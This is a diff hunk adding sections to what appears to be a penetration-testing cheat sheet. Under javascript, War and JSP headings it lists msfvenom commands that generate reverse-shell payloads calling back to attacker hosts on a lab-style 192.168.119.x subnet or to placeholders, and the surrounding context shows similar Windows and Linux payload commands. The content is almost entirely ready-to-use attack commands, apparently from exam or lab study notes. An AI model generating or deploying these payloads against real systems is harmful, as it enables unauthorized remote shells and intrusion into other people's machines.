@@ -58,3 +58,21 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f h
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.153 LPORT=443 -f elf > shell.elf
 ```
 
+### javascript
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.168 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
+```
+
+### War
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+```
+
+### JSP
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.130 LPORT=4444 -f raw > shell.jsp
+```
+
